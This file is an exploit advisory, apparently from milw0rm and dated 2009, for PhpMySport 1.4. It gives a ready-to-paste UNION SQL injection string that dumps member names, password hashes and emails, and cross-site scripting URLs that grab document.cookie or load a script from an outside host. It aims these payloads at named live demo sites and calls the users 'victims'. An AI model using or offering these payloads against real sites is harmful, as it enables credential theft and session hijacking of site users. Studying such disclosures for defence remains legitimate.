@@ -1,0 +1,75 @@
+#####################################################################
+#  + PhpMySport v. 1.4 Multiple Remote Vulnerabilities (XSS\SQL) +  #
+#       ~ Discovered by XaDoS - xados [at] hotmail [dot] it ~       #
+#                      ~ Th4nKs AlpHaNiX ~                          #
+#####################################################################
+
+-Product site: http://phpmysport.sourceforge.net
+-Version vuln: 1.4(latest) and maybe <
+
+[+] COD3:
+
+The code vuln is at page /member_list.php (SQL)
+and many others for (XSS) like
+                        /index.php (v3/4/5/6)
+
+[+] EXPLoIt:
+
+
+>>[$QL]<<
+
+The bug is on the search_member page of this script
+Yuo can write some bad sql code for see tha MD5 encrypted password ant name and other of the users..Example:
+
+http://www.example.com/index.php?r=membre&v1=member_list
+
+write in a search_member form:
+
+-999'/**/union/**/all/**/select/**/1,2,3,4,5,6,7,concat(member_firstname,0x3a,member_pass,0x3a,member_email),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/**/from/**/pms_member#
+
+Now yuo can see the name, password and e-mail of users in the order:
+
+name:password:email
+
+Yuo can also see other informations like description, date of connection,country_id, sex, level_id, lastname, date of birth etc..
+
+(this form is vuln to XSS.. try to inject javaScript ;-))
+
+
+
+>>[XSS]<<
+
+There are some pages vuln..
+for example
+
+http://www.example.com/index.php?r=competition&v1=view&v2=1&v3=1&v4=&v5=all&v6=[XSS]
+
+[XSS] = "><script>alert(document.cookie)</script>
+        or
+        "><script src="http://www.badsite.com/page.js"></script>
+
+
+########::D&m0::########
+
+[SQL]:
+
+http://olmobasket.altervista.org/phpmysport/index.php?r=membro&v1=member_list
+
+Write in the search_member form the right query:
+
+-999'/**/union/**/all/**/select/**/1,2,3,4,5,6,7,concat(member_firstname,0x3a,member_pass,0x3a,member_email),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/**/from/**/pms_member#
+
+Yuo will see the name:password:email of victims
+
+[XSS]:
+
+http://phpmysport.sourceforge.net/demo/index.php?r=competition&v1=view&v2=1&v3=1&v4=&v5=all&v6=5%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%20src=http://www.securitycode.it/x.js%3E%3C/script%3E
+
+#############
+/.end
+
+"They danced down the streets like dingledodies, and I shambled after as I've been doing all my life after people who interest me, because the only people for me are the mad ones, the ones who are mad to live, mad to talk, mad to be saved, desirous of everything at the same time, the ones who never yawn or say a commonplace thing, but burn, burn, burn like fabulous yellow roman candles exploding like spiders across the stars and in the middle you see the blue centerlight pop and everybody goes "OHooooo!"
+
+<3 Beat Generation (or Byte generation ;-))
+
+# milw0rm.com [2009-03-12]
